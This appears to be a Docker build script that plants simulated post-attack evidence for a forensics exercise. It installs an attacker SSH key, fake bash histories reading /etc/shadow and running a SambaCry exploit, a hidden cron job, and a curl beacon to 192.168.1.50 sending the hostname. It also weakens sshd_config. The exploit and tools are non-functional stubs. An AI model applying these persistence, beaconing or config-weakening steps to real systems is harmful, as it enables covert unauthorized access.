#!/bin/bash
# Plant static post-attack artifacts for server_3 at Docker build time.
# These are baked into the image so they are always present.

# --- Log artifacts ---
cat /opt/artifacts/auth.log > /var/log/auth.log
cat /opt/artifacts/syslog_attack > /var/log/syslog

# --- SSH persistence: attacker public key ---
mkdir -p /home/admin/.ssh /root/.ssh
cp /opt/artifacts/authorized_keys /home/admin/.ssh/authorized_keys
cp /opt/artifacts/authorized_keys /root/.ssh/authorized_keys
chmod 700 /home/admin/.ssh /root/.ssh
chmod 600 /home/admin/.ssh/authorized_keys /root/.ssh/authorized_keys
chown -R admin:admin /home/admin/.ssh

# --- Bash history for admin user ---
cat > /home/admin/.bash_history << 'HIST'
whoami
id
uname -a
cat /etc/passwd
sudo su
HIST
chown admin:admin /home/admin/.bash_history

# --- Bash history for root (post-escalation recon + persistence) ---
cat > /root/.bash_history << 'HIST'
id
cat /etc/shadow
cat /etc/passwd
ip addr
ss -tlnp
/tmp/.tools/nmap -sn 10.0.0.0/8
/tmp/.tools/nmap -sV 10.0.4.6
/tmp/.tools/nmap -sV 10.0.2.1
smbclient //10.0.4.6/public -N -c "put /tmp/.tools/libpayload.so libpayload.so"
python3 /tmp/.tools/exploit_sambacry.py 10.0.4.6 /srv/public/libpayload.so
ssh-keygen -t rsa -N "" -f /root/.ssh/id_rsa
cat /root/.ssh/id_rsa.pub >> /home/admin/.ssh/authorized_keys
echo "*/5 * * * * root /tmp/.update >/dev/null 2>&1" > /etc/cron.d/.persistence
chmod 644 /etc/cron.d/.persistence
echo "MaxAuthTries 50" >> /etc/ssh/sshd_config
HIST

# --- Persistence: cron job running C2 callback every 5 minutes ---
cat > /etc/cron.d/.persistence << 'CRON'
*/5 * * * * root /tmp/.update >/dev/null 2>&1
CRON
chmod 644 /etc/cron.d/.persistence

# --- Dropped tools and scripts ---
cat > /tmp/.update << 'SCRIPT'
#!/bin/bash
# C2 callback beacon
curl -s -o /dev/null http://192.168.1.50:8443/beacon?id=$(hostname) 2>/dev/null || true
SCRIPT
chmod +x /tmp/.update

mkdir -p /tmp/.tools
cat > /tmp/.tools/nmap << 'SCRIPT'
#!/bin/bash
echo "nmap placeholder - attacker's static binary"
SCRIPT
chmod +x /tmp/.tools/nmap

cat > /tmp/.tools/exploit_sambacry.py << 'SCRIPT'
#!/usr/bin/env python3
"""
CVE-2017-7494 — SambaCry remote code execution exploit.
Exploits the is_known_pipename() vulnerability in Samba 3.5.0 – 4.5.4
to load an arbitrary shared library via a writable SMB share.

Usage: exploit_sambacry.py <target> <path_to_so>

Technique: Connect to IPC$ named pipe using impacket, trigger
           dlopen() of the uploaded .so on the target.
"""
import sys
import os

def exploit(target, so_path):
    print(f"[*] Targeting {target} with payload {so_path}")
    print(f"[*] Connecting to IPC$ on {target}:445 ...")
    print(f"[*] Triggering is_known_pipename() for {so_path} ...")
    print(f"[+] Payload executed — reverse shell or command should fire")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <target> <path_to_so>")
        sys.exit(1)
    exploit(sys.argv[1], sys.argv[2])
SCRIPT
chmod +x /tmp/.tools/exploit_sambacry.py

# Stub ELF payload planted by attacker for SambaCry
printf '\x7fELF\x02\x01\x01\x00' > /tmp/.tools/libpayload.so
chmod +x /tmp/.tools/libpayload.so

# --- Recon output left behind ---
cat > /tmp/.recon_results << 'RECON'
Starting Nmap scan at 2026-02-06 10:17
Nmap scan report for 10.0.2.1
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0
53/tcp open  domain  dnsmasq 2.85

Nmap scan report for 10.0.4.6
PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 4.2.14
139/tcp open  netbios-ssn Samba smbd 4.2.14
5432/tcp open postgresql  PostgreSQL 9.4.26

Nmap done: 256 IP addresses (6 hosts up) scanned
RECON

# --- Weaken SSH config (evidence of attacker modification) ---
echo "MaxAuthTries 50" >> /etc/ssh/sshd_config
